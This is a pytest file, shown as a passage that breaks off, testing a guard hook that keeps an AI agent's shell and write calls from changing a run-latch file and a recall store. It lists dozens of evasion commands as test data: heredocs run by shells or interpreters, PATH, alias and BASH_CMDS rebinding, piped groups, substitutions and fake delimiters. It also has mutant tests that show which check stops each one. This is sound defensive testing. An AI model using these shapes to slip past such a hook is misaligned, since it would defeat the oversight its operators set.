def test_csr_latch_pinned_exemption_versus_a_same_named_script(latch_world: _StoreWorld) -> None:
    """AC-29: the pinned script exemption (Guard item 3) covers a segment that
    names the latch, and a same-named script outside the skill root does not.
    Both calls name the latch as a trailing word: the guard reads a call's
    words, not the script's options."""
    elsewhere = latch_world.tmp / "x" / "scripts" / "mem_recall.py"
    elsewhere.parent.mkdir(parents=True)
    shutil.copyfile(_PINNED_RECALL, elsewhere)
    args = (
        f"unlatch --impl-artifacts {latch_world.impl.as_posix()} --run-id {_RUN} "
        f"{latch_world.latch.as_posix()}"
    )

    _assert_allowed(*_bash(latch_world, f"uv run {_PINNED_RECALL.as_posix()} {args}"))
    code, out = _bash(latch_world, f"uv run {elsewhere.as_posix()} {args}")
    reason = _assert_latch_denied(code, out, latch_world.latch)
    assert "names the run latch and may change it." in reason


@pytest.mark.parametrize("joiner", ["&&", "||", ";", "|", "\n", "&"])
def test_csr_compound_whose_second_segment_changes_the_latch_denied(
    latch_world: _StoreWorld, joiner: str
) -> None:
    """AC-29: checked per segment, under every separator set. A read, or the
    pinned unlatch, ahead of a change does not cover it."""
    latch = latch_world.latch.as_posix()
    for lead in (f"cat {latch}", _pinned_unlatch(latch_world)):
        code, out = _bash(latch_world, f"{lead} {joiner} rm -f {latch}")
        _assert_latch_denied(code, out, latch_world.latch)


@pytest.mark.parametrize("latch", sorted(_PRESENT_LATCHES))
def test_csr_latch_path_rule_holds_under_every_present_latch(latch_world: _StoreWorld, latch: str) -> None:
    """AC-29: whatever the latch holds (v1, v2 of any colour, unreadable,
    another version), changing it is denied and reading it is not. The rule
    reads no latch, so the no-store latches of C-2 are covered too."""
    _write_state(latch_world.impl, _PRESENT_LATCHES[latch](latch_world.store))
    path = latch_world.latch.as_posix()

    for tool, tool_input in (
        ("Bash", {"command": f"rm -f {path}"}),
        ("Write", {"file_path": path, "content": "{}"}),
    ):
        _assert_latch_denied(*_run_in(latch_world, tool, tool_input), latch_world.latch)
    _assert_allowed(*_bash(latch_world, f"cat {path}"))
    _assert_allowed(*_run_in(latch_world, "Read", {"file_path": path}))


def test_csr_no_latch_leaves_the_latch_path_alone(latch_world: _StoreWorld) -> None:
    """Control: with no latch there is no run and nothing to protect."""
    latch_world.latch.unlink()
    path = latch_world.latch.as_posix()
    for tool, tool_input in (
        ("Bash", {"command": f"rm -f {path}"}),
        ("Write", {"file_path": path, "content": "{}"}),
    ):
        _assert_allowed(*_run_in(latch_world, tool, tool_input))


def test_csr_latch_path_deny_reason_states_the_rule(guard_module, latch_world: _StoreWorld) -> None:
    """The reason quotes the segment, says the model may read the latch but not
    change it and what counts as a read, with the reader list taken from the
    guard itself, then ends with the note for the person (AC-33). It gives no
    recipe for changing the latch (PR 3 review D1): the pinned `latch` and
    `unlatch` calls are exempt by path, so a reason that named them would
    hand the model the one way past the rule it was just told not to take."""
    latch = latch_world.latch.as_posix()
    reason = _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}"), latch_world.latch)

    # Quoted as the guard cuts it: a Windows runner's tmp path is long enough
    # that the 160-character cut falls inside the latch path.
    assert f"segment {guard_module._shown('rm -f ' + latch)} names the run latch and may change it." in reason
    assert "the model's tool calls may read it but not change it" in reason
    assert "a `|` counts as a pipe even inside quotes" in reason
    for name in guard_module._LATCH_READERS:
        assert f"`{name}`" in reason
    for recipe in ("unlatch", "mem_recall.py", "`latch` writes"):
        assert recipe not in reason, f"the deny names {recipe!r}"


_PIPE_CHECK = "    if not _PIPE.search(command):\n        return True\n"
_BARE_READER = "    return not rest or rest[0] in _LATCH_READERS"
_READ_REFUSED_LINE = '_READ_REFUSED = (">", "`", "$(", "<(", "=~")'
_NAME_PASSED = "                name=state_path.name,\n"


def test_mutant_without_the_pipe_check_lets_a_read_hand_the_path_on(
    latch_world: _StoreWorld, tmp_path: Path
) -> None:
    """Twin: drop the pipe check and `ls <latch> | xargs rm` reads as a read;
    the controls still hold, so it is the pipe check the deny rests on."""
    mutant = _write_mutant(tmp_path, "no_pipe_check", _PIPE_CHECK, "    return True\n")
    latch = latch_world.latch.as_posix()

    _assert_allowed(*_bash(latch_world, f"ls {latch} | xargs rm", hook=mutant))
    _assert_allowed(*_bash(latch_world, f"cat {latch}", hook=mutant))
    _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}", hook=mutant), latch_world.latch)


def test_mutant_reader_by_basename_lets_a_written_cat_through(
    latch_world: _StoreWorld, tmp_path: Path
) -> None:
    """Twin: match the reader by basename and a `./cat` the model wrote counts
    as a read; the bare name is what keeps it out."""
    mutant = _write_mutant(
        tmp_path,
        "reader_by_basename",
        _BARE_READER,
        "    return not rest or os.path.basename(rest[0]) in _LATCH_READERS",
    )
    latch = latch_world.latch.as_posix()

    _assert_allowed(*_bash(latch_world, f"./cat {latch}", hook=mutant))
    _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}", hook=mutant), latch_world.latch)


def test_mutant_read_allowing_redirection_lets_cat_overwrite_the_latch(
    latch_world: _StoreWorld, tmp_path: Path
) -> None:
    """Twin: let a read carry `>` and `cat <other> > <latch>` overwrites the
    latch as a "read"; refusing `>` is what denies it."""
    mutant = _write_mutant(
        tmp_path, "read_allows_redirection", _READ_REFUSED_LINE, '_READ_REFUSED = ("`", "$(", "<(", "=~")'
    )
    latch = latch_world.latch.as_posix()
    other = (latch_world.tmp / "other.json").as_posix()

    _assert_allowed(*_bash(latch_world, f"cat {other} > {latch}", hook=mutant))
    _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}", hook=mutant), latch_world.latch)


def test_mutant_read_allowing_a_regex_match_hands_the_path_on(
    latch_world: _StoreWorld, tmp_path: Path
) -> None:
    """Twin: let a read carry `=~` and `[[ <latch> =~ .* ]] && rm
    "$BASH_REMATCH"` passes, its `rm` never naming the latch; refusing `=~`
    is what denies it."""
    mutant = _write_mutant(
        tmp_path, "read_allows_regex_match", _READ_REFUSED_LINE, '_READ_REFUSED = (">", "`", "$(", "<(")'
    )
    latch = latch_world.latch.as_posix()

    _assert_allowed(*_bash(latch_world, f'[[ {latch} =~ .* ]] && rm -f "$BASH_REMATCH"', hook=mutant))
    _assert_allowed(*_bash(latch_world, f"[[ -f {latch} ]]", hook=mutant))


def test_mutant_without_the_file_name_lets_a_cd_reach_the_latch(
    latch_world: _StoreWorld, tmp_path: Path
) -> None:
    """Twin: stop passing the latch's file name and a `cd` into its folder
    followed by `rm .mem-state.json` passes, while the path itself is still
    denied; the name rule is what closes the `cd` form."""
    mutant = _write_mutant(tmp_path, "no_file_name", _NAME_PASSED, "")
    command = f"cd {_LATCH_DIR} && rm -f .mem-state.json"

    _assert_allowed(*_bash(latch_world, command, hook=mutant))
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
    _assert_latch_denied(
        *_bash(latch_world, f"rm -f {latch_world.latch.as_posix()}", hook=mutant), latch_world.latch
    )


# --- Heredoc bodies that are data (issue #176) -----------------------------------
# A body bash only hands to `cat` or `tee` is data, so the latch and store rules
# read the command without it. Every shape where bash can run the body, or
# where the reading cannot vouch for where a body ends, is read as before.

# A gate report appended from the latch's own folder. `(ledger row 6).**` holds
# `.**`, a dot glob that matches the latch there; the table's `|` made the
# command count as piped; the apostrophes do not tokenize.
_REPORT_BODY = (
    "### (2) Reading the two cases\n"
    "\n"
    "- **Both halves, on the real paths.** The paste half drives `handle_paste`, "
    "the link half drives `handle_link`. Neither calls a step directly.\n"
    "- **Each asserts the required precondition (ledger row 6).** The answer's "
    "shape is `Rejected`, which `map_status` builds from the server's 401.\n"
    "\n"
    "| # | Mutant | Result |\n"
    "| --- | --- | --- |\n"
    "| 0 | the early return | KILLED |\n"
)


def _report(world: _StoreWorld) -> str:
    return (world.tmp / "test-artifacts" / "automation-summary-1-1.md").as_posix()


@pytest.mark.parametrize(
    "opener,closer",
    [
        ("cat >> {report} <<'EOF'", "EOF"),
        ('cat >> {report} <<"EOF"', "EOF"),
        ("cat >> {report} <<\\EOF", "EOF"),
        ("cat >> {report} <<-'EOF'", "\tEOF"),
        ("cat > {report} << 'EOF'", "EOF"),
        ("tee -a {report} <<'EOF'", "EOF"),
        ("LC_ALL=C cat >> {report} <<'EOF'", "EOF"),
    ],
    ids=["single-quoted", "double-quoted", "escaped", "dash", "spaced", "tee", "safe-assignment"],
)
def test_csr_quoted_heredoc_report_from_the_latch_folder_passes(
    latch_world: _StoreWorld, opener: str, closer: str
) -> None:
    """Issue #176: a markdown report appended with a quoted heredoc, from the
    latch's own folder, passes. Its body is data handed to `cat` or `tee`."""
    command = f"{opener.format(report=_report(latch_world))}\n{_REPORT_BODY}{closer}"
    _assert_allowed(*_bash(latch_world, command, cwd=latch_world.impl))


@pytest.mark.parametrize(
    "before,after",
    [
        ("", "grep -c $'\\u2014' {report}; git -C {worktree} status --porcelain | wc -l"),
        ("", "grep -cE 'KILLED|SURVIVED' {report}"),
        ("", "export LC_ALL=C"),
        ("", "echo $((1 + 2))"),
        ("", 'for f in {report}; do wc -l "$f"; done'),
        ("", 'g() {{ wc -l "$1"; }}; g {report} | cat'),
        ("", "{{ echo done; }} | wc -l"),
        ("git -C {worktree} log --oneline | head -1\n", ""),
        ("ls | wc -l; ", ""),
    ],
    ids=[
        "count-then-status-piped",
        "quoted-alternation",
        "export",
        "arithmetic",
        "loop",
        "function",
        "group-piped",
        "pipe-on-a-line-before",
        "pipe-before-a-separator",
    ],
)
def test_csr_report_append_beside_other_commands_passes(latch_world: _StoreWorld, before: str, after: str) -> None:
    """Issue #176 as reported: the append was followed, on the line after its
    delimiter, by a count of the report and a `git status` piped to `wc -l`.
    A pipe in another pipeline cannot reach the body, and what runs after the
    sink cannot change what it ran, so the body stays data."""
    names = {"report": _report(latch_world), "worktree": (latch_world.impl / ".gate-worktree-1-1").as_posix()}
    command = f"{before.format(**names)}cat >> {names['report']} <<'EOF'\n{_REPORT_BODY}EOF"
    if after:
        command += f"\n{after.format(**names)}"
    _assert_allowed(*_bash(latch_world, command, cwd=latch_world.impl))


def test_csr_the_report_body_still_denies_where_bash_runs_it(latch_world: _StoreWorld) -> None:
    """Twin of the passes above: the same body fed to a shell, piped onward
    (on its operator's line, past the body from a line ending in `|`, or from
    a group around it), with command lookup changed before it, or with nothing
    that makes it a heredoc's body, is read as commands, and its `.**` names
    the latch from its folder."""
    report = _report(latch_world)
    for command in (
        f"bash <<'EOF'\n{_REPORT_BODY}EOF",
        f"cat <<'EOF' | sh\n{_REPORT_BODY}EOF",
        f"cat <<'EOF' |\n{_REPORT_BODY}EOF\nsh",
        f"{{ echo start; cat <<'EOF'\n{_REPORT_BODY}EOF\n}} | sh",
        f"export PATH=/tmp/evil:$PATH\ncat >> {report} <<'EOF'\n{_REPORT_BODY}EOF",
        f"echo start > {report}\n{_REPORT_BODY}",
    ):
        reason = _assert_latch_denied(*_bash(latch_world, command, cwd=latch_world.impl), latch_world.latch)
        assert "names the run latch and may change it." in reason


def test_csr_data_heredoc_keeps_reads_of_the_latch_a_read(latch_world: _StoreWorld) -> None:
    """A body's table `|` no longer makes the command count as piped, so a
    read of the latch beside the report stays a read. (`tee -a`, not `cat >>`:
    the separator set without the newline reads the two lines as one segment,
    and a `>` in it is no read.)"""
    latch = latch_world.latch.as_posix()
    command = f"cat {latch}\ntee -a {_report(latch_world)} <<'EOF'\n{_REPORT_BODY}EOF"
    _assert_allowed(*_bash(latch_world, command, cwd=latch_world.impl))


def test_csr_unquoted_heredoc_prose_passes_and_its_substitutions_are_read(latch_world: _StoreWorld) -> None:
    """An unquoted delimiter: the body's plain text is data, while each
    substitution bash runs in it is read as a command."""
    report = _report(latch_world)
    body = "Run at $(date -u), by `whoami`; costs $5.\n| a | b |\nThe latch is .mem-state.json, it's kept.\n"
    _assert_allowed(*_bash(latch_world, f"cat > {report} <<EOF\n{body}EOF", cwd=latch_world.impl))
    _assert_latch_denied(
        *_bash(latch_world, f"cat > {report} <<EOF\n{body}$(rm -f .mem-state.json)\nEOF", cwd=latch_world.impl),
        latch_world.latch,
    )


def _heredoc_bypasses(target: str, out: str) -> dict[str, str]:
    """Commands where bash changes `target` outside any data body: each must
    be denied. `out` is a harmless file to write."""
    change = f"rm -rf {target}"
    return {
        # A command that runs what it reads.
        "bash": f"bash <<'EOF'\n{change}\nEOF",
        "sh-s": f"sh -s <<'EOF'\n{change}\nEOF",
        "zsh": f"zsh <<'EOF'\n{change}\nEOF",
        "dash": f"dash <<'EOF'\n{change}\nEOF",
        "ksh": f"ksh <<'EOF'\n{change}\nEOF",
        "python3": f"python3 - <<'EOF'\nimport shutil\nshutil.rmtree('{target}')\nEOF",
        "node": f"node <<'EOF'\nrequire('fs').rmSync('{target}', {{recursive: true}})\nEOF",
        "perl": f"perl <<'EOF'\nunlink '{target}';\nEOF",
        "ruby": f"ruby <<'EOF'\nFile.delete('{target}')\nEOF",
        "php": f"php <<'EOF'\n<?php unlink('{target}');\nEOF",
        "uv-run-python": f"uv run python - <<'EOF'\nimport os; os.remove('{target}')\nEOF",
        "xargs": f"xargs rm -rf <<'EOF'\n{target}\nEOF",
        "source-stdin": f"source /dev/stdin <<'EOF'\n{change}\nEOF",
        "dot-stdin": f". /dev/stdin <<'EOF'\n{change}\nEOF",
        "git-apply": f"git apply <<'EOF'\n--- a{target}\n+++ /dev/null\nEOF",
        "patch": f"patch -p0 <<'EOF'\n--- {target}\n+++ /dev/null\nEOF",
        "ed": f"ed -s <<'EOF'\n!{change}\nq\nEOF",
        "sed-f": f"sed -f - {out} <<'EOF'\nw {target}\nEOF",
        "awk-f": f"awk -f - <<'EOF'\nBEGIN {{ system(\"{change}\") }}\nEOF",
        "sqlite3": f"sqlite3 <<'EOF'\n.shell {change}\nEOF",
        "while-read": f"while read -r line; do eval \"$line\"; done <<'EOF'\n{change}\nEOF",
        "env-cat": f"env cat <<'EOF'\n{change}\nEOF",
        "path-assignment": f"PATH=/tmp/evil:$PATH cat <<'EOF'\n{change}\nEOF",
        "function-named-cat": f"cat() {{ bash; }}; cat <<'EOF'\n{change}\nEOF",
        # Command lookup changed before the sink, or after it where a loop or
        # a function runs the sink again.
        "path-on-a-line-before": f"PATH=/tmp/evil:$PATH\ncat <<'EOF'\n{change}\nEOF",
        "export-before": f"export PATH=/tmp/evil:$PATH; cat <<'EOF'\n{change}\nEOF",
        "alias-before": f"shopt -s expand_aliases\nalias cat=bash\ncat <<'EOF'\n{change}\nEOF",
        "hash-before": f"hash -p /bin/bash cat; cat <<'EOF'\n{change}\nEOF",
        "hash-entry-default": f": ${{BASH_CMDS[cat]=/bin/bash}}\ncat <<'EOF'\n{change}\nEOF",
        "hash-entry-substitution": f"BASH_CMDS[cat]=$(command -v bash)\ncat <<'EOF'\n{change}\nEOF",
        "path-substitution": f"PATH=$(echo /tmp/evil):$PATH\ncat <<'EOF'\n{change}\nEOF",
        "path-substitution-blank": f"PATH=$(printf %s /tmp/evil):$PATH\ncat <<'EOF'\n{change}\nEOF",
        "arithmetic-assignment": f"[[ 1 -eq PATH=1 ]]\ncat <<'EOF'\n{change}\nEOF",
        # A rebinding with no `=`: the hash array hit by an increment or a
        # compound assignment in an arithmetic context (issue finding on main's
        # detector), which _HEREDOC_ASSIGNS, needing a `=`, could not see.
        "hash-entry-increment": f"[[ 0 -eq BASH_CMDS[cat]++ ]]\ncat <<'EOF'\n{change}\nEOF",
        "hash-entry-preincrement": f"[[ 1 -eq ++BASH_CMDS[cat] ]]\ncat <<'EOF'\n{change}\nEOF",
        "hash-entry-minus": f"[[ 0 -ne BASH_CMDS[cat]-=-1 ]]\ncat <<'EOF'\n{change}\nEOF",
        "hash-entry-times": f"[[ 1 -ne BASH_CMDS[tee]*=1 ]]\ncat <<'EOF'\n{change}\nEOF",
        "hash-entry-subscript": f"echo ${{a[BASH_CMDS[cat]++]}}\ncat <<'EOF'\n{change}\nEOF",
        "hash-entry-default-colon": f": ${{BASH_CMDS[cat]:=/bin/bash}}\ncat <<'EOF'\n{change}\nEOF",
        "path-between-sinks": f"cat > {out} <<'A'\nnotes\nA\nPATH=/tmp/evil:$PATH\ncat <<'B'\n{change}\nB",
        "for-loop-path-after": f"for i in 1 2; do\ncat <<'EOF'\n{change}\nEOF\nPATH=/tmp/evil:$PATH\ndone",
        "while-loop-path-after": f"while :; do\ncat <<'EOF'\n{change}\nEOF\nPATH=/tmp/evil:$PATH\ndone",
        "function-run-after-path": f"f() {{\ncat <<'EOF'\n{change}\nEOF\n}}\nPATH=/tmp/evil:$PATH\nf",
        # The body handed on to a shell.
        "piped-to-sh": f"cat <<'EOF' | sh\n{change}\nEOF",
        "piped-after-the-body": f"cat <<'EOF' |\n{change}\nEOF\nsh",
        "piped-after-a-comment": f"cat <<'EOF' | # run it\n{change}\nEOF\n\nsh",
        "piped-with-stderr": f"cat <<'EOF' |&\n{change}\nEOF\nsh",
        "continued-into-a-pipe": f"cat <<'EOF' \\\n| sh\n{change}\nEOF",
        "second-operator-piped": f"cat > {out} <<'A'; cat <<'B' |\nnotes\nA\n{change}\nB\nsh",
        "group-piped": f"{{ echo start; cat <<'EOF'\n{change}\nEOF\n}} | bash",
        "group-on-its-own-line-piped": f"{{\ncat <<'EOF'\n{change}\nEOF\n}} | sh",
        "subshell-piped": f"(\ncat <<'EOF'\n{change}\nEOF\n) | sh",
        "if-piped": f"if true; then\ncat <<'EOF'\n{change}\nEOF\nfi | sh",
        "while-piped": f"while :; do\ncat <<'EOF'\n{change}\nEOF\nbreak\ndone | sh",
        "function-piped": f"f() {{\ncat <<'EOF'\n{change}\nEOF\n}}\nf | sh",
        "function-keyword-piped": f"function f {{\ncat <<'EOF'\n{change}\nEOF\n}}\nf | sh",
        "coprocess": f"coproc {{\ncat <<'EOF'\n{change}\nEOF\n}}\nsh <&${{COPROC[0]}}",
        "process-substitution": f"cat <<'EOF' > >(sh)\n{change}\nEOF",
        # An unquoted body runs its substitutions.
        "unquoted-substitution": f"cat > {out} <<EOF\nnote $({change})\nEOF",
        "unquoted-backticks": f"cat > {out} <<EOF\nnote `{change}`\nEOF",
        "unquoted-arithmetic": f"cat > {out} <<EOF\n$(( $({change}) + 1 ))\nEOF",
        "unquoted-parameter": f"cat > {out} <<EOF\n${{x:-$({change})}}\nEOF",
        "unquoted-over-lines": f"cat > {out} <<EOF\nnote $(true\n{change})\nEOF",
        "unquoted-dash": f"cat > {out} <<-EOF\n\tnote $({change})\n\tEOF",
        # The target as the data sink's own output.
        "cat-into-it": f"cat > {target} <<'EOF'\n{{}}\nEOF",
        "cat-appending-to-it": f"cat >> {target} <<'EOF'\n{{}}\nEOF",
        "tee-into-it": f"tee {target} <<'EOF'\n{{}}\nEOF",
        # A command after the delimiter line.
        "after-the-delimiter": f"cat > {out} <<'EOF'\nnotes\nEOF\n{change}",
        "after-a-dash-delimiter": f"cat > {out} <<-'EOF'\n\tnotes\n\tEOF\n{change}\nEOF",
        "after-two-bodies": f"cat > {out} <<'A'; cat >> {out} <<'B'\none\nA\ntwo\nB\n{change}",
        # A line that only resembles a delimiter keeps the body going, so a
        # code body runs on over what reads as the next body.
        "trailing-space": f"bash <<'A'; cat > {out} <<'B'\nx\nA \n{change}\nB\nA\nB",
        "tab-without-dash": f"bash <<'A'; cat > {out} <<'B'\nx\n\tA\n{change}\nB\nA\nB",
        "carriage-return": f"bash <<'A'; cat > {out} <<'B'\nx\nA\r\n{change}\nB\nA\nB",
        # An unquoted body joins a line ending in a backslash to the next.
        "line-continuation": f"cat > {out} <<EOF\nnotes\nEO\\\nF\n{change}\nEOF",
        # A `<<` that is no heredoc.
        "single-quoted-operator": f"cat '{out} <<EOF'\n{change}\nEOF",
        "double-quoted-operator": f'cat "{out} <<EOF"\n{change}\nEOF',
        "escaped-operator": f"cat \\<<EOF\n{change}\nEOF",
        "here-string": f"cat <<<EOF\n{change}\nEOF",
        "comment": f"cat {out} # see <<EOF\n{change}\nEOF",
        "arithmetic": f"cat {out}$(( 1 <<EOF ))\n{change}\nEOF",
        "arithmetic-command": f"(( n = 1 <<EOF )); cat {out}\n{change}\nEOF",
        "test": f"[[ -f {out} <<EOF ]] || cat\n{change}\nEOF",
        # bash ends a body inside a substitution early, at `EOF)`.
        "command-substitution": f"x=$(cat <<'EOF'\ndata\nEOF)\n{change}\nEOF\n)",
        "quoted-substitution": f"cat \"$(cat <<'EOF'\n{out}\nEOF)\"\n{change}\nEOF\n)\"",
        "backticks": f"x=`cat <<'EOF'\ndata\nEOF`\n{change}",
        # No delimiter line: the reading cannot vouch for the body.
        "unterminated": f"cat > {out} <<'EOF'\nnotes\n{change}",
    }


_HEREDOC_BYPASSES = tuple(_heredoc_bypasses("/t", "/o"))


@pytest.mark.parametrize("name", _HEREDOC_BYPASSES)
def test_csr_heredoc_that_bash_can_run_still_names_the_latch(latch_world: _StoreWorld, name: str) -> None:
    """Issue #176, fail closed: leaving a body out is the direction that can
    let a change through, so every shape where bash runs the body, or runs
    what follows a body, or where the reading is unsure, still denies."""
    out = (latch_world.tmp / "notes.md").as_posix()
    command = _heredoc_bypasses(latch_world.latch.as_posix(), out)[name]
    reason = _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
    assert "names the run latch and may change it." in reason


@pytest.mark.parametrize("name", _HEREDOC_BYPASSES)
def test_csr_heredoc_that_bash_can_run_still_names_the_store(store_world: _StoreWorld, name: str) -> None:
    """Issue #176: the store rule reads heredocs the same way as the latch
    rule, so each shape is denied on the store too."""
    out = (store_world.tmp / "notes.md").as_posix()
    command = _heredoc_bypasses(store_world.s, out)[name]
    reason = _assert_latch_denied(*_bash(store_world, command), store_world.latch)
    assert f"names the recall store {store_world.store}" in reason


def test_csr_quoted_heredoc_that_mentions_the_store_passes(store_world: _StoreWorld) -> None:
    """Issue #176, the store rule's half: a report that quotes the store path
    in a data body passes; the claude-mem rule still reads every body."""
    out = (store_world.tmp / "notes.md").as_posix()
    body = f"The run store is {store_world.s}, and its records sit in {store_world.s}/runs.\n"
    _assert_allowed(*_bash(store_world, f"cat >> {out} <<'EOF'\n{body}EOF"))
    _assert_allowed(*_bash(store_world, f"tee {out} <<'EOF'\n{body}EOF"))
    code, out_json = _bash(store_world, f"cat >> {out} <<'EOF'\nclaude-mem kept ~/.claude-mem\nEOF")
    assert "reaches into '.claude-mem'" in _assert_latch_denied(code, out_json, store_world.latch)


@pytest.mark.parametrize(
    "command,expected",
    [
        ("cat > f <<'EOF'\na | b\nEOF\nls", "cat > f <<'EOF'\nls"),
        ("cat > f <<-EOF\n\tnow $(date) and `id` | x\n\tEOF\n", "cat > f <<-EOF\n$(date)\n`id`\n"),
        ("cat <<A; tee g <<'B'\none\nA\ntwo\nB\necho after", "cat <<A; tee g <<'B'\necho after"),
        ("cat <<'A'; bash <<'B'\none\nA\ntwo\nB", "cat <<'A'; bash <<'B'\ntwo\nB"),
        ("cat > f <<EOF\n${x:-a} $[1] and ) later\nEOF", "cat > f <<EOF\n${x:-a}\n$[1]\n"),
        ("bash <<'EOF'\nrm x\nEOF", None),
        ("cat <<'EOF' | sh\nrm x\nEOF", None),
        ("cat <<'EOF'\nrm x", None),
        ("x=$(cat <<'EOF'\nrm x\nEOF\n)", None),
        ("case $1 in a) cat <<'EOF'\nrm x\nEOF\n;; esac", None),
        ("for f in a; do cat <<'EOF'\nrm x\nEOF\ndone", None),
        ("cat > f <<'EOF'\na\nEOF\nls | wc -l", "cat > f <<'EOF'\nls | wc -l"),
        ("cat <<'EOF' |\nrm x\nEOF\nsh", None),
        ("cat <<'A' | sh\nrm x\nA\ncat > f <<'B'\nnotes\nB", "cat <<'A' | sh\nrm x\nA\ncat > f <<'B'\n"),
        ("{\ncat <<'EOF'\nrm x\nEOF\n} | sh", None),
        ("export A=1\ncat <<'EOF'\nrm x\nEOF", None),
        ("cat <<'EOF'\nrm x\nEOF\nexport A=1", "cat <<'EOF'\nexport A=1"),
        ("cat <<'EOF'\nrm x\nEOF\nfor f in a; do :; done", "cat <<'EOF'\nfor f in a; do :; done"),
        ("PATH=$(echo /x):$PATH\ncat <<'EOF'\nrm x\nEOF", None),
        ("ls --format=long\ncat > f <<'EOF'\na\nEOF", "ls --format=long\ncat > f <<'EOF'\n"),
    ],
    ids=[
        "quoted",
        "unquoted-dash",
        "two-sinks",
        "sink-then-shell",
        "unquoted-closers",
        "shell",
        "piped",
        "unterminated",
        "substitution",
        "case",
        "loop",
        "pipe-on-a-later-line",
        "piped-past-the-body",
        "piped-then-data",
        "group-piped",
        "rebinding-before",
        "rebinding-after",
        "loop-after",
        "assignment-with-a-blank-before",
        "option-before",
    ],
)
def test_csr_heredoc_data_reading(guard_module, command: str, expected: str | None) -> None:
    """What the latch and store rules read of a command: a data body left out,
    of an unquoted one only its substitutions (each up to the body's last
    closer), any other body kept, and the command as it is wherever bash may
    run every body or the reading is unsure (None)."""
    assert guard_module._without_heredoc_data(command) == (command if expected is None else expected)


_SINK_CHECK = "        if not _heredoc_sink(heredoc.head):\n            continue\n"
_QUOTED_CHECK = "        if not heredoc.quoted:\n"


def test_mutant_any_command_as_a_sink_runs_a_shell_body(latch_world: _StoreWorld, tmp_path: Path) -> None:
    """Twin: take every heredoc's command for a data sink and `bash <<'EOF'`
    hides the `rm` it runs, while the report still passes; the sink check is
    what keeps the shell's body a command."""
    mutant = _write_mutant(tmp_path, "any_sink", _SINK_CHECK, "")
    command = f"bash <<'EOF'\nrm -f {latch_world.latch.as_posix()}\nEOF"

    _assert_allowed(*_bash(latch_world, command, hook=mutant))
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
    report = f"cat >> {_report(latch_world)} <<'EOF'\n{_REPORT_BODY}EOF"
    _assert_allowed(*_bash(latch_world, report, cwd=latch_world.impl, hook=mutant))


def test_mutant_unquoted_read_as_quoted_hides_a_substitution(latch_world: _StoreWorld, tmp_path: Path) -> None:
    """Twin: read an unquoted delimiter as a quoted one and a `$(rm ...)` the
    body runs is left out; keeping the substitutions is what denies it."""
    mutant = _write_mutant(tmp_path, "unquoted_as_quoted", _QUOTED_CHECK, "        if False:\n")
    command = f"cat > {_report(latch_world)} <<EOF\nnote $(rm -f {latch_world.latch.as_posix()})\nEOF"

    _assert_allowed(*_bash(latch_world, command, hook=mutant))
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)


_PIPED_CHECK = "        if heredoc.piped:\n            continue\n"
_WRAPPED_CHECK = "        if scan.compound is not None and scan.compound < heredoc.start:\n"
_BEFORE_CHECK = "            if lookup_changed:\n                continue\n"


@pytest.mark.parametrize(
    "name,old,new,shape",
    [
        ("no_piped", _PIPED_CHECK, "", "cat <<'EOF' |\n{change}\nEOF\nsh"),
        ("no_wrapper", _WRAPPED_CHECK, "        if False:\n", "{{\ncat <<'EOF'\n{change}\nEOF\n}} | sh"),
        ("no_before", _BEFORE_CHECK, "", "PATH=/tmp/evil:$PATH\ncat <<'EOF'\n{change}\nEOF"),
    ],
    ids=["pipe-after-the-sink", "wrapper", "lookup-changed-before"],
)
def test_mutant_without_a_narrowed_check_a_shell_runs_the_body(
    latch_world: _StoreWorld, tmp_path: Path, name: str, old: str, new: str, shape: str
) -> None:
    """Twins of the checks that replaced the whole-command pipe and lookup
    fallbacks (issue #176): drop one and a body bash hands to a shell, or to a
    `cat` that PATH points elsewhere, is left out, so the `rm` of the latch in
    it passes. The report with a pipe on a later line passes either way."""
    mutant = _write_mutant(tmp_path, name, old, new)
    command = shape.format(change=f"rm -f {latch_world.latch.as_posix()}")

    _assert_allowed(*_bash(latch_world, command, hook=mutant))
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
    report = f"cat >> {_report(latch_world)} <<'EOF'\n{_REPORT_BODY}EOF\nls | wc -l"
    _assert_allowed(*_bash(latch_world, report, cwd=latch_world.impl, hook=mutant))


# --- Rebinding command lookup without a plain `NAME=` --------------------------
# _command_rebinds reads a command's segment heads split at blanks, so it used
# to miss a rebinding dressed as arithmetic, as a hash-array entry, or as an
# assignment whose value opens a substitution (shlex splits it). Each of these
# changes what a later `cat`, `uv` or `python` resolves to, so it must refuse
# both the latch-read exemption and the recall-script exemption.

_REBIND_SHAPES = {
    "hash-default": ": ${BASH_CMDS[cat]:=/bin/rm}",
    "hash-default-no-colon": ": ${BASH_CMDS[cat]=/bin/rm}",
    "hash-entry-assign": "BASH_CMDS[cat]=/bin/rm",
    "hash-entry-increment": "[[ 0 -eq BASH_CMDS[cat]++ ]]",
    "hash-entry-preincrement": "[[ 1 -eq ++BASH_CMDS[cat] ]]",
    "hash-entry-compound": "[[ 0 -ne BASH_CMDS[cat]-=-1 ]]",
    "hash-entry-times": "[[ 1 -ne BASH_CMDS[cat]*=1 ]]",
    "hash-entry-in-subscript": "echo ${a[BASH_CMDS[cat]++]}",
    "alias-array": "BASH_ALIASES[x]=y",
    "path-value-substitution": "PATH=$(printf %s /tmp/evil):$PATH",
    "path-value-backtick": "PATH=`printf %s /tmp/evil`:$PATH",
    "test-arithmetic-assignment": "[[ 1 -eq PATH=1 ]]",
    "subscript-assignment": "echo ${a[PATH=1]}",
    "subscript-assignment-bare": "test -v 'a[PATH=1]'",
    "substring-offset-assignment": "s=abc; echo ${s:x=1}",
    # Each `${...}` form that still assigns once a `=` later in it no longer
    # counts: its operator right after the name, through `!` too, and the
    # arithmetic of a substring or a subscript, blanks and nesting included.
    "indirect-default": ": ${!x:=/tmp/evil}",
    "substring-offset": "echo ${PWD:PATH=1}",
    "substring-length-spaced": "echo ${PWD:0:PATH = 1}",
    "substring-after-a-nested-expansion": "echo ${PWD:${#x}:PATH=1}",
    "subscript-spaced": "echo ${a[ PATH = 1 ]}",
    "subscript-of-a-length": "echo ${#a[PATH=1]}",
    "subscript-nested-increment": "echo ${a[b[c]++]}",
    # A subscript where bash evaluates it outside a `${...}`: in a word that
